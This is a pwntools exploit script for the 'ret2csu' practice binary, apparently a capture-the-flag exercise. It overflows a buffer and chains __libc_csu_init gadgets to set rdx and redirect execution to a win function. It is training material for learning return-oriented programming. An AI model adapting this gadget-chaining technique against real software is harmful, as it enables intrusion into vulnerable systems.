import pwn


populate_rdx_rsi_rdi_call_qword = 0x00400880
pop_rbx_rbp_r12_r13_r14_r15 = 0x0040089a
fini_ptr = 0x600e48
BUFFER = "A"*(40)


def populate_registers(rbx, rbp, r12, r13, r14, r15):
    rop = ""
    rop += pwn.p64(pop_rbx_rbp_r12_r13_r14_r15)
    rop += pwn.p64(rbx)
    rop += pwn.p64(rbp)
    rop += pwn.p64(r12)
    rop += pwn.p64(r13)
    rop += pwn.p64(r14)
    rop += pwn.p64(r15)

    return rop


def populate_rdx(rdx_value, libc_csu_fini_ptr):
    # the gadget has a call to qword [r12 + rbx*8], we will hold in r12
    # the address for __libc_csu_fini, and rbx will be 0.
    rbx = 0
    # __libc_csu_init has a whether or no  rbp is 1,
    # in order to pass it, set rbo to 1.
    rbp = 1
    r12 = libc_csu_fini_ptr
    r13 = 5
    r14 = 4
    # the value of r15 is moved into rdx.
    r15 = rdx_value

    rop = populate_registers(rbx, rbp, r12, r13, r14, r15)

    rop += pwn.p64(populate_rdx_rsi_rdi_call_qword)
    # a buffer is required du to add rsp, 8
    rop += pwn.p64(1)
    # the end of the fuinction has 6 pop instuction.
    rop += (pwn.p64(1) * 6)

    return rop


elfile = pwn.ELF('ret2csu')
payload = (BUFFER + populate_rdx(0xdeadcafebabebeef, fini_ptr) +
           pwn.p64(elfile.symbols['ret2win']))

pwn.context.terminal = ['st', '-e', 'sh', '-c']
DEBUG = False

if DEBUG:
    proc = pwn.gdb.debug('./ret2csu', """
    b * 0x004007ae
    continue
    """)
else:
    proc = pwn.process("./ret2csu")

initial_out = proc.recvuntil(">")
proc.sendline(payload)
print(proc.recvall())
